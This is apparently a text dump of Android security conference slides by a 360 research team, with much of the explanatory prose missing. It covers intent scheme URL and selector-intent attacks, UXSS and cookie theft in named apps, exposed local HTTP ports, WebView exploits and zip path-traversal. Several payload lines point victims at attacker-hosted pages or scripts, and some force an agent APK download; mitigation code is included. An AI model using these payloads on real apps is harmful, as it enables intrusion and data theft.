APP
z7sky &  @360VulpeckerTeam


z7sky &  360VulpeckerTeam Android APP  weibo: @0xr0ot @z7sky



Mobile Pwn2Own 2013
Mobile Pwn2Own 2013Pinkie Pie chrome0day web ,2014Takeshi Terada Pwn2own exploitintent 





Intent

Intent Scheme Url
Chrome v18,iframesrcscheme WebandroidChrome v25 scheme"intent:" 
intent scheme url 
1.Intent.parseUri(uri);url intent 2.intent  3.Context#startActivityIfNeeded() Context#startActivity()2 intentactivity



data

extra

intent:mydata#Intent;action=com.me.om;S.url=file:///mnt/sdcard/Down load/xss.html;SEL;component=com.ex.uritest/com.ex.uritest.MainActiv ity;end

selector intent

selector intent activity

intent 
S.browser_fallback_url=[encoded_full_url]

BROWSABLE Category

1. android.intent.category.BROWSABLE
AndroidManifest.xml category  

Selector Intent
2. Selector Intent
Android API level 15(Android 4.0.3) Selector intentselector intentmain intentmain intentselector intent, Android Frameworkselector intent
intent://appscan#Intent;S.url=file:///mnt/sdcard/Download/xss.html;SEL;component=com. ex.uritest/com.ex.uritest.MainActivity;end
SELcom.ex.uritest.MainActivityselector intent,android frameworkselector intentcom.ex.uritest.MainActivity android.intent.category.BROWSABLE category

Chrome
SELchrome Intent intent = Intent.parseUri(uri); intent.addCategory("android.intent.category.BROWSABLE"); intent.setComponent(null); context.startActivityIfNeeded(intent, -1);
1.Categoryandroid.intent.category.BROWSABLEactivity intent 2.
chromeselector intent.


,


Cookie Theft & UXSS


1. http://blogs.360.cn/360mobile/2014/08/25/miui-rce-vul/ com.xiaomi.shop.activity.MainActivity
intent:#Intent;component=com.xiaomi.shop/com.xiaomi.shop.activity.MainActivity;S.co m.xiaomi.shop.extra_closed_url=http://server/acttack.html;end

Webview RCE
 http://security.360.cn/Index/news/id/59.html  addJavascriptInterface() js



   2345  

action data  

extra 

component BROWSABLE sel







       









( activity)





 







   

  







Mercury

  







()
2.
4.2webview SEL  
intent:#Intent;S.url=http://server/attack.html;SEL; component=com.sohu.inputmethod.sogou/com.sogou.androidtool.WebPushActivity; end


AndroguardparseUri()loadUrl()addJavascriptInterface()
loadUrlintent scheme url, webview hook

Hook Intent
hookintentintent 


intent filter
// convert intent scheme URL to intent object Intent intent = Intent.parseUri(uri); // forbid launching activities without BROWSABLE category intent.addCategory("android.intent.category.BROWSABLE"); intent.setComponent(null); // forbid explicit call intent.setSelector(null); // forbid intent with selector intent context.startActivityIfNeeded(intent, -1); // start the activity by the intent




1:
tmastAPKAPK  tmast://download?downl_biz_id=qb&down_ticket=11&downl_url=https%3A%2f%2fwww.mw rinfosecurity.com%2fsystem%2fassets%2f934%2foriginal%2fdrozer-agent-2.3.4.apk";

XSSsohu JS
<a href="tmast://webview?url=http://m.tv.sohu.com/hots/128?vid=2xss%22};document.getEleme ntsByTagName('head')[0].appendChild(document.createElement('script')).src='//hacker/1.js?xx' ;test={x:%22:">TEST2<br>

jsb http://qzs.qq.com/open/mobile/yyb_gift_center/open_yyb_gift_test.html

jsjsb://

2KNOX
MDMsmdm smdm://meow?update_url=http://youserver MDMurlupdate_url/latest HEADETagContent-Lengthx-amz-meta-apk-version

MDMheaderx-amz-meta-apk-version MDMx-amz-meta-apk-versionAPK v01 getapk, 

MDM_installApplication(),  (GoogleAPK)
 


3
V5.3.0 sinaweibo:// .
POC: <script>location.href="XXX";</script>
XXX= sinaweibo://browser/close  sinaweibo://compose?pack=com.yixia.videoeditor  sinaweibo://addgroupmember?containerid=102603
sinaweibo://browser/?url=http://www.vul.com/uxss.html xss(uxss)csrf


APP

Androidsockets(TCPUDPUNIX) 
0.0.0.0,IP 127.0.0.1

V5.2.0

ID

native(libweibohttp.so)http server,127.0.0.1 9527

httpcom.sina.weibo.utils.weibohttpd.a/b/c
 1.http://127.0.0.1:9527/login?callback=xxx 2.http://127.0.0.1:9527/query?appid=com.sina.weibo 3.http://127.0.0.1:9527/si?cmp=com.sina.weibo_


http://127.0.0.1:9527/login?callback=xxx

http://127.0.0.1:9527/query?appid=com.tencent.mtt QQ "no install".

http://127.0.0.1:9527/si?cmp=com.sina.weibo_componentname 

 http://127.0.0.1:9527/si?cmp=com.sina.weibo_com.sina.weibo.exlibs.NewProjectModeActiv ityPreLoading"",


 netstatnetstatBusyboxp Google play:netstat plus,:
 /proc/net/tcp /proc/net/tcp6 /proc/net/udp /proc/net/udp6
 

iframe.src = "http://127.0.0.1:9527/si?cmp=com.sohu.inputmethod.sogou_sogou.mobile.explorer.hotwords. HotwordsWebViewActivity&data=http://X.X.X.X:80/go.html";


HackingTeam0day

HackingTeam android  browser  exploit
 CVE-2011-1202 CVE-2012-2825 CVE-2012-2871
 android4.3 webview 
android  4.4   5.1


X5 UCU3 T5

1CVE-2011-1202()
generate-id()

patch



2CVE-2012-2825()
 patch
 

3CVE-2012-2871()
<xsl:for-each select="namespace::*">

Proof of concept > android 4.4








1arrayBuffer  2arrayBuffer  3 4ROP  chain

X5
 HOW
 Weibo X5


URL scheme
weibo
Server socket intent with data

loadUrl
X5
RCE

""

APK
apkzipapkclasses.dex appappclasses.dex odex


·  · 


· Zip ZipEntry.getName"../"
· DexClassLoader

exploit
1dexodex Dalvikvm

2odex

modTime

crc

3zip

1 SDK

2 

3 UC


odex
· zip"../" · adb backup, allowBackup="false" · Odexsdcard
odex
· odex · odex


360  vulpecker  Team:
@RAyH4c @sniperhg @zpd2009

Thanks!

